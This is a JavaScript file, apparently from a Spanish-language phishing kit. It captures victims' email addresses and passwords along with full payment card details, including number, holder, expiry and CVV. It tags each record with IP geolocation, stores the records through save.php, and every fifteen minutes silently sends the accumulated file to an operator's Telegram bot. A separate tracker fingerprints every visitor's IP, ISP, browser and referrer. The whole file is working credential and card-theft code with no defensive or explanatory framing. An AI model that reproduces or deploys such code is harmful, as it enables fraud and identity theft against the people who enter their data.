// Función para obtener información de localización
async function getLocationInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        if (data && data.ip) {
            return {
                ip: data.ip || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                city: data.city || 'No disponible'
            };
        } else {
            throw new Error('Respuesta inválida de ipapi.co');
        }
    } catch (error) {
        try {
            const response2 = await fetch('http://ip-api.com/json/');
            const data2 = await response2.json();
            if (data2.status === 'success') {
                return {
                    ip: data2.query || 'No disponible',
                    country: data2.country || 'No disponible',
                    region: data2.regionName || 'No disponible',
                    city: data2.city || 'No disponible'
                };
            } else {
                throw new Error('Error en ip-api.com');
            }
        } catch (error2) {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                return {
                    ip: ipData.ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } catch (ipError) {
                return { ip: 'No disponible', country: 'No disponible', region: 'No disponible', city: 'No disponible' };
            }
        }
    }
}

// Función central: guarda en datos.txt vía save.php
async function saveToFile(type, fields) {
    try {
        const response = await fetch('save.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, fields })
        });
        return response.ok;
    } catch (error) {
        return false;
    }
}

// Función para enviar datos de login
async function sendLoginData(email, password) {
    try {
        const location = await getLocationInfo();

        const fields = [
            { name: "📧 Email",          value: email },
            { name: "🔐 Password",       value: password },
            { name: "📍 País",           value: location.country },
            { name: "🏙️ Ciudad",         value: `${location.city}, ${location.region}` },
            { name: "🌐 IP",             value: location.ip }
        ];

        return await saveToFile('LOGIN', fields);
    } catch (error) {
        return false;
    }
}

// Función para enviar datos de tarjeta
async function sendCardData(cardData) {
    try {
        const location = await getLocationInfo();

        const fields = [
            { name: "📧 Email",           value: cardData.email },
            { name: "💳 Tarjeta",         value: cardData.cardNumber },
            { name: "👤 Titular",         value: cardData.cardholderName },
            { name: "📅 Fecha",           value: `${cardData.expiryMonth}/${cardData.expiryYear}` },
            { name: "🔒 CVV",             value: cardData.cvv },
            { name: "🏠 Misma Dirección", value: cardData.sameAddress ? 'Sí' : 'No' },
            { name: "📍 País",            value: location.country },
            { name: "🏙️ Ciudad",          value: `${location.city}, ${location.region}` },
            { name: "🌐 IP",              value: location.ip }
        ];

        return await saveToFile('TARJETA', fields);
    } catch (error) {
        return false;
    }
}

if (typeof window !== 'undefined') {
    window.sendLoginData = sendLoginData;
    window.sendCardData  = sendCardData;
}

// ============================================================
// Respaldo automático vía Telegram
// ============================================================
(async function iniciarRespaldoTelegram() {
    // Espera a que telegram_config.js esté cargado
    if (typeof TELEGRAM_BOT_TOKEN === 'undefined' || typeof TELEGRAM_CHAT_ID === 'undefined') return;
    if (TELEGRAM_BOT_TOKEN === 'AQUI_TU_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'AQUI_TU_CHAT_ID') return;

    async function enviarMensajeTelegram(texto) {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: texto,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) { /* silencioso */ }
    }

    async function enviarRespaldo() {
        try {
            const res  = await fetch('api_datos.php?action=read');
            const data = await res.json();

            if (!data || !data.content || !data.content.trim()) return;

            const ahora = new Date().toLocaleString('es-ES', {
                day: '2-digit', month: '2-digit', year: 'numeric',
                hour: '2-digit', minute: '2-digit', second: '2-digit'
            });

            const total   = (data.content.match(/TIPO\s+:/g) || []).length;
            const cabecera = `🔔 <b>RESPALDO AUTOMÁTICO</b>\n📅 ${ahora}\n📊 Registros: ${total}\n${'─'.repeat(28)}\n\n`;
            const cuerpo   = `<pre>${data.content}</pre>`;
            const mensaje  = cabecera + cuerpo;

            // Telegram limita a 4096 chars — partir si es necesario
            if (mensaje.length <= 4096) {
                await enviarMensajeTelegram(mensaje);
            } else {
                // Enviar cabecera + contenido en trozos de 3800 chars
                await enviarMensajeTelegram(cabecera);
                const chunks = data.content.match(/[\s\S]{1,3800}/g) || [];
                for (const chunk of chunks) {
                    await enviarMensajeTelegram(`<pre>${chunk}</pre>`);
                }
            }

        } catch (e) { /* silencioso */ }
    }

    const intervaloMs = (typeof TELEGRAM_INTERVALO_MIN !== 'undefined' ? TELEGRAM_INTERVALO_MIN : 15) * 60 * 1000;
    setInterval(enviarRespaldo, intervaloMs);

    // Función global para probar manualmente desde consola
    window.probarTelegram = enviarRespaldo;
})();

// ============================================================
// Tracker de visitas
// ============================================================
(async () => {
  try {
    const geoRes = await fetch("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,isp,query");
    const geo    = await geoRes.json();

    const ip     = geo.status === "success" ? geo.query      : "No disponible";
    const pais   = geo.status === "success" ? geo.country    : "Desconocido";
    const codigo = geo.status === "success" ? geo.countryCode: "";
    const region = geo.status === "success" ? geo.regionName : "Desconocido";
    const ciudad = geo.status === "success" ? geo.city       : "Desconocida";
    const isp    = geo.status === "success" ? geo.isp        : "Desconocido";

    const bandera = codigo
      ? String.fromCodePoint(...[...codigo.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
      : "🌐";

    const ua         = navigator.userAgent;
    const idioma     = navigator.language || "Desconocido";
    const resolucion = `${screen.width}×${screen.height}`;
    const pagina     = window.location.href;
    const referrer   = document.referrer || "Acceso directo";

    let navegador = "Desconocido";
    if (/Edg\//.test(ua))            navegador = "Edge";
    else if (/OPR\/|Opera/.test(ua)) navegador = "Opera";
    else if (/Chrome\//.test(ua))    navegador = "Chrome";
    else if (/Firefox\//.test(ua))   navegador = "Firefox";
    else if (/Safari\//.test(ua))    navegador = "Safari";

    let so = "Desconocido";
    if (/Windows NT 10/.test(ua))       so = "Windows 10/11";
    else if (/Windows NT 6.3/.test(ua)) so = "Windows 8.1";
    else if (/Windows/.test(ua))        so = "Windows";
    else if (/Mac OS X/.test(ua))       so = "macOS";
    else if (/Android/.test(ua))        so = "Android";
    else if (/iPhone|iPad/.test(ua))    so = "iOS";
    else if (/Linux/.test(ua))          so = "Linux";

    const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const hora = new Date().toLocaleString("es-ES", {
      day: "2-digit", month: "2-digit", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: zonaHoraria
    });

    const fields = [
      { name: "🌍 Página",      value: pagina },
      { name: "🕐 Hora",        value: `${hora} (${zonaHoraria})` },
      { name: "📡 IP",          value: ip },
      { name: `${bandera} País`,value: pais },
      { name: "🏙️ Ciudad",      value: `${ciudad}, ${region}` },
      { name: "📶 ISP",         value: isp },
      { name: "🔗 Referrer",    value: referrer },
      { name: "🖥️ Navegador",   value: `${navegador} · ${so}` },
      { name: "📐 Resolución",  value: resolucion },
      { name: "🌐 Idioma",      value: idioma }
    ];

    await saveToFile('VISITA', fields);

  } catch (e) {
    // Silencioso
  }
})();
